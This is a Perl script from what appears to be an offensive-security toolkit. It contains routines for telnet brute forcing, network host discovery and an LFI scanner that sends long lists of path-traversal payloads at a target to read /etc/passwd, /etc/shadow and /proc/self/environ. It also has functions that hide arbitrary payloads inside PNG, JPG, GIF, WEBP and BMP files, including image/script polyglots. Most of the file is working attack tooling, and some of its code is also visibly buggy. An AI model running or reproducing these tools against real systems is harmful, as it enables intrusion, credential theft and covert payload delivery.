# basic imports
use strict;
use warnings;
use Getopt::Std;
use Cwd;
use English;
use feature 'say';
use POSIX;
use File::Basename;
use Image::ExifTool ':Public';
use Data::HexDump;
use String::CRC32;
use HTTP::Request;
use LWP::UserAgent;


# single modules
use OFSL;
use TABLE;
use BRUTE;
use GD;

# args
my %opts = ();

# o -> options
# f -> filename
getopt('o:f:p:c:h:w:t:e:r:q:u:', \%opts);

#____________________________________________________________________________________
#| Do not use shift here, only opts should be declared, check notes.pod for more info|
#|___________________________________________________________________________________|
# globals

my $stego_mod_path         = "modules/perl/scripts/stego.pl";
my $command                = $opts{o}; # command options
my $filename               = $opts{f}; # input file
my $payload                = $opts{p}; # payload
my $chunk                  = $opts{c}; # chunk for JPG files
my $pixelheight            = $opts{h}; # pixel height
my $pixelwidth             = $opts{w}; # pixel width
my $target_range           = $opts{t}; # target CIDR
my $port_target            = $opts{e}; # Port
my $target                 = $opts{r}; # Target
my $sqlfile                = $opts{q}; # SQL file for parsing
my $username               = $opts{u}; # Username
my $CPU_FILE               = "/proc/cpuinfo";
my $base_help_DIR_FILE     = "/txt/help.txt";
my $base_banner_DIR_FILE   = "/txt/banner.txt";
my $asm                    = "/asm-source/core";
my $blue                   = "\033[34m";
my $Bold_Blue              = "\033[1;34m";
my $red                    = "\033[31m";
my $wht                    = "\033[37m";
my $BLK                    = "\033[0;30m";
my $RED                    = "\033[0;31m";
my $GRN                    = "\033[0;32m";
my $YEL                    = "\033[0;33m";
my $BLU                    = "\033[0;34m";
my $MAG                    = "\033[0;35m";
my $CYN                    = "\033[0;36m";
my $WHT                    = "\033[0;37m";
my $clear_hex              = "\x1b[H\x1b[2J\x1b[3J";
my $getdir                 = "getdir";
my $basename               = File::Basename::basename($PROGRAM_NAME);
my $abs_path               = Cwd::abs_path($PROGRAM_NAME);
my $dirname                = File::Basename::dirname($abs_path);
my $cwd                    = Cwd::cwd();
my $execute                = $cwd.$asm;
my $filehelpmain           = $cwd.$base_help_DIR_FILE;
# arrays

my @hashes;


my @pngtil = (
    (pack 'I>', length $payload),
    "\x50\x55\x6e\x4b",
    $payload,
    # all payloads should be injected at the IEND chunk 
    (pack 'I>', crc32('IEND' . $payload)),
    "\x00IEND",
);

my @build_hex_JPG = (
    "\xff\xd8",
    "\xff\xdb",
    pack('S>', 67),
    "\x00" . "\x01" x 64,
    "\xff\xc2",
    "\x00\x0b",
    "\x08\x00\x01\x00\x01\x01\x01\x11\x00",
    "\xff\xc4",
    "\x00\x14",
    "\x00\x01\x00\x00\x00\x00\x00\x00\x00"."\x00\x00\x00\x00\x00\x00\x00\x00\x03",
    "\xff\xda",
    "\x00\x08",
    "\x01\x01\x00\x00\x00\x01\x3f",
    "\xff\xd9",
);

my $hex_bmp =  "\x42\x4d\x1e\x00\x00\x00\x00\x00\x00\x00\x1a\x00" . "\x00\x00\x0c\x00\x00\x00\x01\x00\x01\x00\x01\x00" . "\x18\x00\x00\x00\xff\x00";

my @env = (
    '../proc/self/environ',
    '../../proc/self/environ',
    '../../../proc/self/environ',
    '../../../../proc/self/environ',
    '../../../../../proc/self/environ',
    '../../../../../../proc/self/environ',
    '../../../../../../../proc/self/environ',
    '../../../../../../../../proc/self/environ',
    '../../../../../../../../../proc/self/environ',
    '../../../../../../../../../../proc/self/environ',
    '../../../../../../../../../../../proc/self/environ',
    '../../../../../../../../../../../../proc/self/environ',
    '../../../../../../../../../../../../../proc/self/environ',
    '../../../../../../../../../../../../../../proc/self/environ',
    '../proc/self/environ%00',
    '../../proc/self/environ%00',
    '../../../proc/self/environ%00',
    '../../../../proc/self/environ%00',
    '../../../../../proc/self/environ%00',
    '../../../../../../proc/self/environ%00',
    '../../../../../../../proc/self/environ%00',
    '../../../../../../../../proc/self/environ%00',
    '../../../../../../../../../proc/self/environ%00',
    '../../../../../../../../../../proc/self/environ%00',
    '../../../../../../../../../../../proc/self/environ%00',
    '../../../../../../../../../../../../proc/self/environ%00',
    '../../../../../../../../../../../../../proc/self/environ%00',
    '../../../../../../../../../../../../../../proc/self/environ%00'
);


my @lfi = (
'../etc/passwd',
'../../etc/passwd',
'../../../etc/passwd',
'../../../../etc/passwd',
'../../../../../etc/passwd',
'../../../../../../etc/passwd',
'../../../../../../../etc/passwd',
'../../../../../../../../etc/passwd',
'../../../../../../../../../etc/passwd',
'../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../../../../../etc/passwd',
'....//etc/passwd',
'....//....//etc/passwd',
'....//....//....//etc/passwd',
'....//....//....//....//etc/passwd',
'....//....//....//....//....//etc/passwd',
'....//....//....//....//....//....//etc/passwd',
'....//....//....//....//....//....//....//etc/passwd',
'....//....//....//....//....//....//....//....//etc/passwd',
'....//....//....//....//....//....//....//....//....//etc/passwd',
'....//....//....//....//....//....//....//....//....//....//etc/passwd',
'../../etc/passwd%00',
'../../../etc/passwd%00',
'../../../../etc/passwd%00',
'../../../../../etc/passwd%00',
'../../../../../../etc/passwd%00',
'../../../../../../../etc/passwd%00',
'../../../../../../../../etc/passwd%00',
'../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../../../../../etc/passwd%00',
'....//etc/passwd%00',
'....//....//etc/passwd%00',
'....//....//....//etc/passwd%00',
'....//....//....//....//etc/passwd%00',
'....//....//....//....//....//etc/passwd%00',
'....//....//....//....//....//....//etc/passwd%00',
'....//....//....//....//....//....//....//etc/passwd%00',
'....//....//....//....//....//....//....//....//etc/passwd%00',
'....//....//....//....//....//....//....//....//....//etc/passwd%00',
'....//....//....//....//....//....//....//....//....//....//etc/passwd%00',
'../etc/shadow',
'../../etc/shadow',
'../../../etc/shadow',
'../../../../etc/shadow',
'../../../../../etc/shadow',
'../../../../../../etc/shadow',
'../../../../../../../etc/shadow',
'../../../../../../../../etc/shadow',
'../../../../../../../../../etc/shadow',
'../../../../../../../../../../etc/shadow',
'../../../../../../../../../../../etc/shadow',
'../../../../../../../../../../../../etc/shadow',
'../../../../../../../../../../../../../etc/shadow',
'../../../../../../../../../../../../../../etc/shadow',
'../etc/shadow%00',
'../../etc/shadow%00',
'../../../etc/shadow%00',
'../../../../etc/shadow%00',
'../../../../../etc/shadow%00',
'../../../../../../etc/shadow%00',
'../../../../../../../etc/shadow%00',
'../../../../../../../../etc/shadow%00',
'../../../../../../../../../etc/shadow%00',
'../../../../../../../../../../etc/shadow%00',
'../../../../../../../../../../../etc/shadow%00',
'../../../../../../../../../../../../etc/shadow%00',
'../../../../../../../../../../../../../etc/shadow%00',
'../../../../../../../../../../../../../../etc/shadow%00',
'../etc/group',
'../../etc/group',
'../../../etc/group',
'../../../../etc/group',
'../../../../../etc/group',
'../../../../../../etc/group',
'../../../../../../../etc/group',
'../../../../../../../../etc/group',
'../../../../../../../../../etc/group',
'../../../../../../../../../../etc/group',
'../../../../../../../../../../../etc/group',
'../../../../../../../../../../../../etc/group',
'../../../../../../../../../../../../../etc/group',
'../../../../../../../../../../../../../../etc/group',
'../etc/group%00',
'../../etc/group%00',
'../../../etc/group%00',
'../../../../etc/group%00',
'../../../../../etc/group%00',
'../../../../../../etc/group%00',
'../../../../../../../etc/group%00',
'../../../../../../../../etc/group%00',
'../../../../../../../../../etc/group%00',
'../../../../../../../../../../etc/group%00',
'../../../../../../../../../../../etc/group%00',
'../../../../../../../../../../../../etc/group%00',
'../../../../../../../../../../../../../etc/group%00',
'../../../../../../../../../../../../../../etc/group%00',
'../etc/security/group',
'../../etc/security/group',
'../../../etc/security/group',
'../../../../etc/security/group',
'../../../../../etc/security/group',
'../../../../../../etc/security/group',
'../../../../../../../etc/security/group',
'../../../../../../../../etc/security/group',
'../../../../../../../../../etc/security/group',
'../../../../../../../../../../etc/security/group',
'../../../../../../../../../../../etc/security/group',
'../etc/security/group%00',
'../../etc/security/group%00',
'../../../etc/security/group%00',
'../../../../etc/security/group%00',
'../../../../../etc/security/group%00',
'../../../../../../etc/security/group%00',
'../../../../../../../etc/security/group%00',
'../../../../../../../../etc/security/group%00',
'../../../../../../../../../etc/security/group%00',
'../../../../../../../../../../etc/security/group%00',
'../../../../../../../../../../../etc/security/group%00',
'../etc/security/passwd',
'../../etc/security/passwd',
'../../../etc/security/passwd',
'../../../../etc/security/passwd',
'../../../../../etc/security/passwd',
'../../../../../../etc/security/passwd',
'../../../../../../../etc/security/passwd',
'../../../../../../../../etc/security/passwd',
'../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../../../../../etc/security/passwd',
'../etc/security/passwd%00',
'../../etc/security/passwd%00',
'../../../etc/security/passwd%00',
'../../../../etc/security/passwd%00',
'../../../../../etc/security/passwd%00',
'../../../../../../etc/security/passwd%00',
'../../../../../../../etc/security/passwd%00',
'../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../../../../../../etc/security/passwd%00',
'../etc/security/user',
'../../etc/security/user',
'../../../etc/security/user',
'../../../../etc/security/user',
'../../../../../etc/security/user',
'../../../../../../etc/security/user',
'../../../../../../../etc/security/user',
'../../../../../../../../etc/security/user',
'../../../../../../../../../etc/security/user',
'../../../../../../../../../../etc/security/user',
'../../../../../../../../../../../etc/security/user',
'../../../../../../../../../../../../etc/security/user',
'../../../../../../../../../../../../../etc/security/user',
'../etc/security/user%00',
'../../etc/security/user%00',
'../../../etc/security/user%00',
'../../../../etc/security/user%00',
'../../../../../etc/security/user%00',
'../../../../../../etc/security/user%00',
'../../../../../../../etc/security/user%00',
'../../../../../../../../etc/security/user%00',
'../../../../../../../../../etc/security/user%00',
'../../../../../../../../../../etc/security/user%00',
'../../../../../../../../../../../etc/security/user%00',
'../../../../../../../../../../../../etc/security/user%00',
'../../../../../../../../../../../../../etc/security/user%00');





# code 
sub main {
    if ($command eq "ql-hash-dumper") {
        Offensive_Security::open_and_dump($opts{q}, $opts{f});
    }
    if ($command eq "lfi") {
        lif_main($target)
    }
    if ($command eq "brute_telnet") {
        Brute::_Telnet_($target, $username, $filename)
    }
    if ($command eq "discover_tcp") {
        Offensive_Security::host_discover($target_range, "tcp");
    }
    if ($command eq "discover_udp") {
        Offensive_Security::host_discover($target_range, "udp");
    }
    if ($command eq "discover_syn") {
        Offensive_Security::host_discover($target_range, "syn");
    }
    if ($command eq "discover_icmp") {
        Offensive_Security::host_discover($target_range, "icmp");
    }
    if ($command eq "tablef") {
        Data_Table::table("$filename", "\033[0;37m", "Command Options");
    }
    if ($command eq "opt1") {
        Offensive_Security::file_exif_table($filename);
    }
    if ($command eq "png") {
        &main_inject_PNG;
    } 
    if ($command eq "webp") {
        &main_webp_injection
    }
    if ($command eq "gif") {
        &main_inject_GIF
    }
    if ($command eq "jpg") {
        &main_injection_JPG;
    }
    if ($command eq "bmp") {
        &bmp;
    }
    if ($command eq "slashc") {
        print port_scanner_slash_check()
    }
    if ($command eq "traceroute") {
        Offensive_Security::traceroute($target);
    }
}

# injection and sub tools 



# hex dumping 

sub hexdump {
    my $hd = Data::HexDump->new();
    $hd->file($filename);
    print while $_ = $hd->dump;
}


#
# JPG injection
#

sub create_jpg {
    say "<RR6> Stego Module: Generating output file";
    sysopen my $fh, $filename, O_CREAT|O_WRONLY;
    for my $hexc (@build_hex_JPG) {
        syswrite $fh, $hexc
    }
    close $fh;
    say "<RR6> Stego Module: File saved to: $filename";
}

sub inject_payload_com {
    say "<RR6> Stego Module: Injecting payload into COMMENT";
    my $exifTool = Image::ExifTool->new;
    $exifTool->SetNewValue('Comment', $payload)or die "<RR6> Stego Module: Failed to Set New Value\n";
    $exifTool->WriteInfo($filename)or die "<RR6> Stego Module:  Fail to WriteInfo\n";
    say "<RR6> Stego Module: Payload was injected successfully\n";
}

sub inject_payload_dqt {
    say "<RR6> Stego Module: Injecting payload into DQT table";
    my $payload_len = length $payload;
    sysopen my $fh, $filename, O_WRONLY;
    sysseek    $fh, (7 + (64 - $payload_len)), SEEK_SET;
    syswrite   $fh, $payload;
    close      $fh;
    say "<RR6> Stego Module: Payload was injected succesfully\n";
}


sub main_injection_JPG {
    &create_jpg if ! -f $filename;
    if (uc $chunk eq 'COM') {
        &create_jpg if ! -f $filename;
        &inject_payload_com;
    }
    elsif (uc $chunk eq 'DQT') {
        die "The payload size must not exceed 64 bytes!\n" if length($payload) > 64;
        &create_jpg; 
        &inject_payload_dqt;
    }
    else {
        die "section to inject argument must be COM or DQT!\n";
    }
    hexdump();
    say "<RR6> Stego Module: Payload injection into $filename was injected without fail"
}

#
# WEBP Injection
#

sub create_webp {
    say "<RR6> Stego Create: Generating output file";
    my $minimal_webp = "\x52\x49\x46\x46\x1a\x00\x00\x00"."\x57\x45\x42\x50\x56\x50\x38\x4c"."\x0d\x00\x00\x00\x2f\x00\x00\x00"."\x10\x07\x10\x11\x11\x88\x88\xfe"."\x07\x00";
    sysopen my $fh, $filename, O_CREAT|O_WRONLY;
    syswrite   $fh, $minimal_webp;
    close      $fh;
    say "<RR6> Stego Create: File saved to: $filename \n";
}

sub inject_payload_webp {
    say "<RR6> Stego Module: Injecting payload into $filename";
    sysopen my $fh, $filename, O_WRONLY;
    sysseek    $fh, 4, SEEK_SET;
    syswrite   $fh, "\x2f\x2a";
    sysseek    $fh, 15, SEEK_SET;
    syswrite   $fh, "\x4c\xff\xff\xff";
    sysseek    $fh, 0, SEEK_END;
    syswrite   $fh, "\x2a\x2f\x3d\x31\x3b";
    syswrite   $fh, $payload;
    syswrite   $fh, "\x3b";
    close      $fh;
    say "<RR6> Stego Module: Payload was injected successfully\n";
}

sub main_webp_injection {
    if (-f $filename) {
        say "<RR6> Stego Module: File exists, injecting $filename";
    } 
    else {
        say "<RR6> Stego Module: $filename does not exist. Creating a new blank WEBP file named $filename";
        &create_webp;
    }
    &inject_payload_webp;
    &hexdump;
}


#
# GIF format injection 
#

# needed this if statement here
sub create_gif {
    say "<RR6> Stego Module: Generating output file";
    if ($pixelheight eq "" or $pixelwidth eq "") {
        say "<RR6> Stego Module ERR -> WARNING: You did not specify a pixel width or height, using standard 476px 280px";
        my $img = GD::Image->new(1200,800,1,);
        my $color = $img->colorAllocate(0, 0, 0);
        $img->setPixel(0, 0, $color);
        sysopen my $fh, $filename, O_CREAT|O_WRONLY;
        syswrite   $fh, $img->gif;
        close      $fh;
        say "<RR6> Stego Module: File saved as $filename \n";
    } 
    else {
        say "<RR6> Stego Module: Using current pixel height and width | $pixelheight - $pixelwidth | ";
        my $img = GD::Image->new(
            $pixelwidth,
            $pixelheight,
        1,
        );
        my $color = $img->colorAllocate(0, 0, 0);
        $img->setPixel(0, 0, $color);
        sysopen my $fh, $filename, O_CREAT|O_WRONLY;
        syswrite   $fh, $img->gif;
        close      $fh;
        say "<RR6> Stego Module: File saved as -> $filename \n";
    }
}

sub inject_payload_GIF {
    say "<RR6> Stego Module: Injecting payload into $filename";
    sysopen my $fh, $filename, O_WRONLY;
    sysseek    $fh, 6, SEEK_SET;
    syswrite   $fh, "\x2f\x2a";
    sysseek    $fh, 0, SEEK_END;
    syswrite   $fh, "\x2a\x2f\x3d\x31\x3b";
    syswrite   $fh, $payload;
    syswrite   $fh, "\x3b";
    close      $fh;
    say "<RR6> Stego Module: Payload was injected successfully\n";
}



sub main_inject_GIF {
    if (-f $filename) {
        say "<RR6> Stego Module: File exists, no need to create a new one"
    } 
    else {
        say "<RR6> Stego Module: File does NOT exist, creating new GIF";
        &create_gif;
    }
    say "<RR6> Stego Module: Payload injected -> $payload";
    &inject_payload_GIF;
    &hexdump;
}


# 
#  BMP image injection
# 

sub bmp {
    say "$BLU<RR6> Stego Module: [BMP] Checking if file exists.....";
    if (-f $filename) {
            say "$BLU<RR6> Stego Module: [BMP] Does EXIST, not going to bother to create a new one";
    } else {
        say "$BLU<RR6> Stego Module: [BMP] File did NOT exist, creating a new one";
        sysopen my $fh, $filename, O_CREAT|O_WRONLY;
        syswrite   $fh, $hex_bmp;
        close      $fh;
    }
    say "$BLU<RR6> Stego Module: [BMP] File exists, writting payload using the syscall table....";
    sysopen my $fh, $filename, O_RDWR;
    sysseek    $fh, 2, SEEK_SET;
    syswrite   $fh, "\x2f\x2a";
    sysseek    $fh, 0, SEEK_END;
    syswrite   $fh, "\x2a\x2f\x3d\x31\x3b";
    syswrite   $fh, $payload;
    syswrite   $fh, "\x3b";
    close      $fh;
    say "$BLU<RR6> Stego Module: [BMP] Payload has been injected into $filename.....";
    &hexdump;
}

#
# PNG IMAGE INJECTION
#

sub systell {
    sysseek $_[0], 0, SEEK_CUR
}


sub create_PNG {
    say "<RR6> Stego Module: [PNG] Generating new file | reason -> $filename does not exist ";
    if ($pixelheight eq "" or $pixelwidth eq "") {
        say "<RR6> Stego Module: [PNG] Pixel width or height was not defined using defualt";
        my $img = GD::Image->new(860, 881, 1,);
        my $color = $img->colorAllocate(0, 0, 0);
        $img->setPixel(0, 0, $color);
        sysopen my $fh, $filename, O_CREAT|O_WRONLY;
        syswrite   $fh, $img->png;
        close      $fh;
        say "<RR6> Stego Module: [PNG] File saved as: $filename\n";
    }
    else {
        say "<RR6> Stego Module: [PNG] Pixel width or height was defined | $pixelwidth - $pixelheight | ";
        my $img = GD::Image->new($pixelwidth, $pixelheight, 1,);
        my $color = $img->colorAllocate(0, 0, 0);
        $img->setPixel(0, 0, $color);
        sysopen my $fh, $filename, O_CREAT|O_WRONLY;
        syswrite   $fh, $img->png;
        close      $fh;
        say "<RR6> Stego Module: [PNG] File saved as -> $filename\n";
    }
}

sub inject_payload_PNG {
    say "<RR6> Stego Module: [PNG] Injecting payload < $payload > into < $filename > \n";
    sysopen our $fh, $filename, O_RDWR;
    {
        my $format;
        sysseek     $fh, 1, SEEK_SET;
        sysread     $fh, $format, 3;
        die "<RR6> Stego Module: [PNG] USER ERROR -> WARNING -> FATAL : $filename is not a PNG file and does not have the values to be one" if $format ne "PNG";
    }
    sysseek     $fh, 8, SEEK_SET;
    sub read_chunks {
        *read_next_chunk = \&read_chunks;
        my ($chunk_size, $chunk_type, $content, $crc);
        sysread $fh, $chunk_size, 4;
        sysread $fh, $chunk_type, 4;
        $chunk_size = unpack('I>', $chunk_size);
        say "[+] Chunk size: $chunk_size";
        say "[+] Chunk type: $chunk_type";
        return if $chunk_type eq 'IEND';
        sysread $fh, $content, $chunk_size;
        sysread $fh, $crc, 4;
        say '[+] CRC: ' . unpack('H8', $crc);
        &read_next_chunk;
    }
    &read_chunks;
    rewind   $fh, 8;
    say "\n<RR6> Stego Module: [PNG] Inject payload to the new chunk: 'pUnk'";
    for my $edit (@pngtil) {
        syswrite $fh, $edit;
    }
    close    $fh;
    say "<RR6> Stego Module: [PNG] Payload was injected successfully\n";
}



sub main_inject_PNG {
    if (-f $filename) {
        say "<RR6> Stego Module: [PNG] Filename exists, no need to create a new one";
    }
    else {
        say "<RR6> Stego Module: [PNG] Filename does NOT exist, creating a new one";
        &create_PNG;
    }
    &inject_payload_PNG;
    &hexdump;
}

sub port_scanner_slash_check {
    my $method = "tcp";
    my $socket = IO::Socket::INET->new(
        Proto => $method,
        PeerAddr => $opts{r},
        PeerPort => $opts{e},
    );
    if($@) {
        return "[-] Could not connect |$target:$port_target| \n";
    } else {
        return "[+] Was able to establish a connection to -> |$target:$port_target| \n"
    }
}

# lfi defs

sub lif_main{
    my $targ = shift;
    lfi:;
        if($targ !~ /http:\/\//) { my $host = "http://$targ"; };

    env:;
        if($targ !~ /http:\/\//) { my $targ = "http://$targ"; };
    my $counter = 0;
    foreach my $scan(@lfi){
    my $url = $targ.$scan;
    my $request = HTTP::Request->new(GET=>$url);
    my $useragent = LWP::UserAgent->new();
    my $response = $useragent->request($request);
    print "\n<RR6> Payload Module: - Testing: $url - ";
    print "\n----------------------------------------";
    if ($response->is_success && $response->content =~ /root:x:/) { 
        my $counter += 1;
        my $msg = "LFI vulnerability found";
        print "\n<RR6> Net Module: - \033[31m[$msg] - [$counter] \n";

    }
    else { 
        my $counter += 1;
        my $msg = "Not Infected";
        print "\n<RR6> Net Module: - \033[31m[$msg] - [$counter] \n";
    }

    }

    foreach my $scan_env(@env){
        my $url = $targ.$scan_env;
        my $request = HTTP::Request->new(GET=>$url);
        my $useragent = LWP::UserAgent->new();
        print "\n<RR6> Payload Module: - Testing: $url - ";
        print "\n----------------------------------------";
        my $response = $useragent->request($request);
        if ($response->is_success && $response->content =~ /HTTP_ACCEPT/ && $response->content =~ /HTTP_HOST/) { 
            my $counter += 1;
            my $msg = " LFI vulnerable ENV detected";
            print "\n<RR6> Net Module: - [$msg] - [$counter]\n";
        } else { 
            my $counter += 1;
            my $msg = "Not Infected";
            print "\n<RR6> Net Module: - [$msg] - [$counter]\n";
        }
    }
}



main;